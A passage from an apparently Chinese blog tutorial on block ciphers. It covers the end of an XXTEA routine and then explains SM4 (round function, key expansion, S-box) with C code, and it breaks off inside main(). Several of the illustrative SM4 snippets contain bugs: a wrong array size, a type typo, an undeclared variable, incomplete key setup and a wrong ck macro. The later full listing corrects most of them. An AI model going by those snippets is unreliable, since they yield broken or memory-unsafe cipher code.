v[<span class="number">0</span>];</span><br><span class="line">        z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span> ; </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">      n = -n;</span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      sum = q*DELTA ;</span><br><span class="line">      <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) z = v[p<span class="number">-1</span>], y = v[p] -= MX;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>n表示v的长度，正数表示加密，负数解密</p>
<h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><ul>
<li><p>密钥长度为128bits</p>
</li>
<li><p>加密算法和密钥扩展算法都是32位非线性迭代结构</p>
</li>
<li><p>加解密算法结构相同，轮密钥的使用顺序相反</p>
</li>
</ul>
<h4 id="定义运算"><a href="#定义运算" class="headerlink" title="定义运算"></a>定义运算</h4><p>32位数$x$向左循环移动$i$位$:x&lt;&lt;&lt;i,\oplus$为异或</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)x&gt;&gt;(32-(i)))))</span></span></span><br></pre></td></tr></table></figure>
<h4 id="定义参量"><a href="#定义参量" class="headerlink" title="定义参量"></a>定义参量</h4><p>密钥长度位128bits $MK=(MK_0,MK_1,MK_2,MK_3)$</p>
<p>轮密钥为32*32bits $rk=(rk<em>0,rk_1,…,rk</em>{31})$</p>
<p>$FK=(FK<em>0,FK_1,…,FK_3)$为系统参数，$CK=(CK_0,CK_1,…,CK</em>{31})$为固定参数</p>
<p>$CK_{i,j}=(4i+j)*7\ mod\ 256$，其中$i$为双字编号，$j$为字节编号，$j$采用大端序</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RK_SIZE 32</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> mk[<span class="number">4</span>];    <span class="comment">// 加密使用的密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rk[<span class="number">31</span>];    <span class="comment">// 轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> fk[<span class="number">4</span>]=&#123;<span class="number">0xA3B1BAC6</span>,<span class="number">0x56AA3350</span>,<span class="number">0x677D9197</span>,<span class="number">0xB27022DC</span>&#125;;</span><br><span class="line"><span class="comment">// ck会在密钥生成算法中体现</span></span><br></pre></td></tr></table></figure>
<h4 id="轮函数F"><a href="#轮函数F" class="headerlink" title="轮函数F"></a>轮函数F</h4><p>$F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)$</p>
<p>合成置换$T(.)=L(\tau(.))$</p>
<p>若输入为$A=(a_0,a_1,a_2,a_3)$，其中$a_i$为8字节无符号整数，则非线性置换$\tau(A)=(sbox[a_0],sbox[a_1],sbox[a_2],sbox[a_3])$</p>
<p>$sbox$为替换用s盒</p>
<p>若输入为$B$，其中$B$为32字节无符号整数，则线性变换$L(B)=B\oplus (B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) (x)^ROL32(x,2)^ROL32(x,10)^ROL32(x,18)^ROL32(x,24)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) (sbox[(x)&gt;&gt;24]<span class="meta-string">&lt;&lt;24|sbox[((x)&gt;&gt;16)&amp;0xFF]&lt;&lt;16|sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8|sbox[x&amp;0xFF])</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T(x) (L(tau(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> sbox[<span class="number">256</span>]; <span class="comment">// s盒，在最终代码中体现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮函数F直接在加密过程中体现</span></span><br></pre></td></tr></table></figure>
<h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p>反序变换$R(a_0,a_1,a_2,a_3)=(a_3,a_2,a_1,a_0),a_i$为8位</p>
<p>设输入为$(X_0,X_1,X_2,X_3),X_i$为32位</p>
<p>输出为$(Y_0,Y_1,Y_2,Y_3)$</p>
<p>则$X<em>{i+4}=F(X_i,X</em>{i+1},X<em>{i+2},X</em>{i+3},rk_i)$</p>
<p>$(Y<em>0,Y_1,Y_2,Y_3)=R(X</em>{32},X<em>{33},X</em>{34},X_{35})$</p>
<p>解密过程和加密过程变换结构相同，不同的是轮密钥顺序</p>
<p>加密时$(rk<em>0,rk_1,…,rk</em>{31})$</p>
<p>解密时$rk<em>{31},rk</em>{30},…,rk_0$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>],<span class="keyword">uint32_t</span> crk[<span class="number">31</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c[<span class="number">36</span>];</span><br><span class="line">    c[<span class="number">0</span>]=p[<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">1</span>]=p[<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">2</span>]=p[<span class="number">2</span>];</span><br><span class="line">    c[<span class="number">3</span>]=p[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;RK_SIZE;i++)&#123;</span><br><span class="line">        c[i+<span class="number">4</span>]=c[i]^T(c[i+<span class="number">1</span>]^c[i+<span class="number">2</span>]^c[i+<span class="number">3</span>]^crk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">0</span>]=c[<span class="number">35</span>];</span><br><span class="line">    p[<span class="number">1</span>]=c[<span class="number">34</span>];</span><br><span class="line">    p[<span class="number">2</span>]=c[<span class="number">33</span>];</span><br><span class="line">    p[<span class="number">3</span>]=c[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    crypt(p,rk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> c[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    crypt(p,rrk); <span class="comment">// rrk是rk的逆序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h4><p>密钥$MK=(MK_0,MK_1,MK_2,MK_3)$</p>
<p>$K=(K<em>0,K_1,…,K</em>{31})$</p>
<p>$(K_0,K_1,K_2,K_3)=(MK_0\oplus FK_0,MK_1\oplus FK_1,MK_2\oplus FK_2,MK_3\oplus FK_3)$</p>
<p>轮密钥为$rk,rk<em>i=K</em>{i+4}=K<em>i\oplus T’(K</em>{i+1}\oplus K<em>{i+2}\oplus K</em>{i+3}\oplus CK_i)$</p>
<p>$T’$和$T$基本相同，其中的$L’=B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Lp(x) ((x)^ROL32(x,13)^ROL32(x,23))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Tp(x) Lp(tau(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck(i) (((4*(i)*7)&amp;0xFF)&lt;&lt;24|(((4*(i)+1)*7)&amp;0xFF)&lt;&lt;16|(((4*(i)+2)*7)&amp;0xFF)&lt;&lt;8|(4*(i)+3)&amp;0xFF)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uin32_t</span> mk[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>]=mk[<span class="number">0</span>]^fk[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;RK_SIZE;i++)&#123;</span><br><span class="line">        k[i+<span class="number">4</span>]=k[i]^Tp(k[i+<span class="number">1</span>]^k[i+<span class="number">2</span>]^k[i+<span class="number">3</span>]^ck(i));</span><br><span class="line">        rk[i]=k[i+<span class="number">4</span>];</span><br><span class="line">        rrk[RK_SIZE-i]=rk[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cha(x) ((((x)&amp;0x3F)+24)%64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)(x)&gt;&gt;(32-(i)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) (x)^ROL32(x,2)^ROL32(x,10)^ROL32(x,18)^ROL32(x,24)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) (sbox[((x)&gt;&gt;24)&amp;0xFF]<span class="meta-string">&lt;&lt;24|sbox[((x)&gt;&gt;16)&amp;0xFF]&lt;&lt;16|sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8|sbox[x&amp;0xFF])</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T(x) (L(tau(x)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Lp(x) ((x)^ROL32(x,13)^ROL32(x,23)) <span class="comment">// L&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Tp(x) (Lp(tau(x))) <span class="comment">// T&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck(i) (((4*(i)*7)&amp;0xFF)&lt;&lt;24|(((4*(i)+1)*7)&amp;0xFF)&lt;&lt;16|(((4*(i)+2)*7)&amp;0xFF)&lt;&lt;8|(4*(i)+3)*7&amp;0xFF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R(x) (((x)&gt;&gt;24)&amp;0xFF|((x)&gt;&gt;8)&amp;0xFF00|((x)&lt;&lt;8)&amp;0xFF0000|((x)&lt;&lt;24))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RK_SIZE 32      <span class="comment">// 密钥轮数</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rk[<span class="number">32</span>];    <span class="comment">// 轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rrk[<span class="number">32</span>];    <span class="comment">// 逆序轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> fk[<span class="number">4</span>] = &#123; <span class="number">0xA3B1BAC6</span>,<span class="number">0x56AA3350</span>,<span class="number">0x677D9197</span>,<span class="number">0xB27022DC</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line"><span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line"><span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>], <span class="keyword">uint32_t</span> crk[<span class="number">31</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c[<span class="number">36</span>];</span><br><span class="line">    c[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">2</span>] = p[<span class="number">2</span>];</span><br><span class="line">    c[<span class="number">3</span>] = p[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; RK_SIZE; i++) &#123;</span><br><span class="line">        t = (c[i + <span class="number">1</span>] ^ c[i + <span class="number">2</span>] ^ c[i + <span class="number">3</span>] ^ crk[i]);</span><br><span class="line">        c[i + <span class="number">4</span>] = c[i] ^ T(t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, c[i + <span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">0</span>] = c[<span class="number">35</span>];</span><br><span class="line">    p[<span class="number">1</span>] = c[<span class="number">34</span>];</span><br><span class="line">    p[<span class="number">2</span>] = c[<span class="number">33</span>];</span><br><span class="line">    p[<span class="number">3</span>] = c[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    crypt(p, rk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> c[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    crypt(c, rrk); <span class="comment">// rrk是rk的逆序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uint32_t</span> mk[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>] = mk[<span class="number">0</span>] ^ fk[<span class="number">0</span>];</span><br><span class="line">    k[<span class="number">1</span>] = mk[<span class="number">1</span>] ^ fk[<span class="number">1</span>];</span><br><span class="line">    k[<span class="number">2</span>] = mk[<span class="number">2</span>] ^ fk[<span class="number">2</span>];</span><br><span class="line">    k[<span class="number">3</span>] = mk[<span class="number">3</span>] ^ fk[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; RK_SIZE; i++) &#123;</span><br><span class="line">        t = k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>]^ck(i);</span><br><span class="line">        k[i + <span class="number">4</span>] = k[i] ^ Tp(t);</span><br><span class="line">        rk[i] = k[i + <span class="number">4</span>];</span><br><span class="line">        rrk[RK_SIZE - i<span class="number">-1</span>] = rk[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint32_t</span>* d, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s============\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X,&quot;</span>, d[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n============================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123; <span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span> &#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = &#123; <span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> mk[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> p[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(p, data, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(mk, key, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span 